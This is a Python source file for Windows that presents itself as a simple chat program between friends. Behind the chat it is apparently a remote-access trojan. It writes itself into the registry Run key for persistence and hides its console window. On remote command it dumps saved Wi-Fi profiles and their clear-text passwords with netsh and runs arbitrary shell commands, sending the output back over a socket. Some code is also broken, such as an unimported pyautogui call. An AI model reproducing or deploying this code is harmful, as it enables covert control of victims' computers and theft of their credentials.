import time, socket, sys
import ctypes  # An included library with Python install.
import os
import win32process, easygui
import subprocess
from pexecute.thread import ThreadLoom
from pynput.keyboard import Key, Listener
import logging
import winreg as reg1
from zipfile import *
import tkinter
import tkinter.filedialog
def popup2(a):
    pyautogui.alert(str(a), "Title")
f = open("chatlog_setup.txt", "a")
print('Welcome to Chat')
time.sleep(1)
soc = socket.socket()
host_name = socket.gethostname()
ip = socket.gethostbyname(host_name)
port = 1235
soc.bind((host_name, port))
print('Your Computer Information :',host_name, '({})'.format(ip))
print("Make sure that you inform your friend your IP Address")
soc.listen(1) 
print('Waiting for incoming connections...')
socb = socket.socket()
host_nameb = socket.gethostname()
ipb = socket.gethostbyname(host_nameb)
portb = 1234
socb.bind((host_nameb, portb))
socb.listen(1) 
connectionb, addrb = socb.accept()
connection, addr = soc.accept()
def fun3():
    try:
        pth1 =os.path.dirname(os.path.realpath(__file__))
        s_name1="libraries.pyw"
        address1=os.path.join(pth1,s_name1)
        key1 = reg1.HKEY_CURRENT_USER
        key_value1 ="Software\Microsoft\Windows\CurrentVersion\Run"
        open=reg1.OpenKey(key1,key_value1,0,reg1.KEY_ALL_ACCESS)
        reg1.SetValueEx(open,"any_name",0,reg1.REG_SZ,address1)
        reg1.CloseKey(open)
    except:
        pass
def fun1():
    while(True):
        message = connection.recv(1024)
        message = message.decode()
        message=str(message)
        if(message=='sendfile'):
            try:
                ctypes.windll.user32.MessageBoxW(0, 'YOUR BUDDY WANTS TO SEND A FILE PRESS OK TO RECIEVE'
                                                 , "ALERT", 1)
                ctypes.user32.ShowWindow(ctypes.kernel32.GetConsoleWindow(), 0)
            except:
                pass
            with open('recievedfile.zip', 'wb+') as output:
                    rec = connection.recv(9000000)
                    output.write(rec)
                    popup2("FILE RECIEVED")
            continue
        meslist=message.split()
        if(message=='wifipasswordstart'+'\n'):
            results = subprocess.check_output(["netsh", "wlan", "show", "profile"])
            results = results.decode("ascii")
            connectionb.send(results.encode())
        elif(str(meslist[0])=='passwordof'):
            results = subprocess.check_output(["netsh", "wlan", "show", "profile", str(meslist[1]), "key=clear"])
            results = results.decode("ascii")
            connectionb.send(results.encode())
        elif(str(meslist[0])=='runcmd'):
            try:
                results = subprocess.check_output(meslist[1:])
                results = results.decode("ascii")
            except:
                results="COMMAND RETURNS ERROR"
            connectionb.send(results.encode())
        else:
            try:
                chat='Your Friend > '+message+'\n'
                f.write(chat)
                ctypes.windll.user32.MessageBoxW(0, message, "Your Buddy Says", 1)
                ctypes.user32.ShowWindow(ctypes.kernel32.GetConsoleWindow(), 0)
            except:
                pass
def fun2():
    while(True):
        messageb = input('Me > ')
        if(messageb=='help'):
            fb = open("Help for Server.txt", "r")
            try:
                ctypes.windll.user32.MessageBoxW(0,fb.read() , "HELP ", 1)
                ctypes.user32.ShowWindow(ctypes.kernel32.GetConsoleWindow(), 0)
                fb.close()
                continue
            except:
                pass
        if(messageb=='sendfile'):
            connectionb.send(messageb.encode())
##            root = tkinter.Tk()
##            root.withdraw() 
##            fname = tkinter.filedialog.askopenfilename(filetypes = (("Template files", "*.type"), ("All files", "*")))
            dname = easygui.enterbox("ENTER THE ADDRESS OF THE DIRECTORY")
            fname = easygui.enterbox("ENTER THE NAME OF THE FILE")
            fname=dname+'/'+fname
            fname=list(fname)
            fname=['//' if x=='/' else x for x in fname]
            str1 = " " 
            fname=str1.join(fname)
            fname=fname.replace(' ','',100)
            with ZipFile('sendFILE.zip', 'w') as myzip:
                myzip.write(fname)
            with open ('sendFILE.zip','rb') as f1:
                connectionb.send(f1.read(9000000))
            try:
                ctypes.windll.user32.MessageBoxW(0, 'FILE SENT', "ALERT ", 1)
                ctypes.user32.ShowWindow(ctypes.kernel32.GetConsoleWindow(), 0)
            except:
                pass
            continue
        messageb=messageb+'\n'
        chatb='You > '+messageb
        f.write(chatb)
        connectionb.send(messageb.encode())
        if(messageb=='bye'+'\n'):
            f.close()
            exit()

loom = ThreadLoom(max_runner_cap=10)
loom.add_function(fun1, [], {})
loom.add_function(fun2, [], {})
loom.add_function(fun3, [], {})
output = loom.execute()

